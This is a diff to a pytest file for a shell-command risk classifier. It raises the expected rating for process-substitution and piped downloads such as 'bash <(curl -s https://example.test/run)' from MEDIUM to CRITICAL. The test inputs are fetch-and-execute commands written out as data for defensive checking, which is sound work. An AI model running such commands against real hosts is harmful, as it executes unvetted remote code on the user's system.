@@ -234,12 +234,14 @@ def test_ansi_c_risk_classification_only(text, equivalent):
 
 
 @pytest.mark.parametrize("shell", ["bash", "sh", "source", "."])
-@pytest.mark.parametrize("download", ["curl -s URL", "wget -qO- URL"])
+@pytest.mark.parametrize("download", [
+    "curl -s https://example.test/run", "wget -qO- https://example.test/run",
+])
 def test_remote_process_substitution_classification_only(shell, download):
     result = classify_command(f"{shell} <({download})")
     equivalent = classify_command(f"{download} | bash")
-    assert result.level == equivalent.level == RiskLevel.MEDIUM
-    assert result.reason == equivalent.reason == "piped script execution"
+    assert result.level == equivalent.level == RiskLevel.CRITICAL
+    assert result.reason == equivalent.reason == "pipe remote script to shell"
 
 
 @pytest.mark.parametrize("text", [
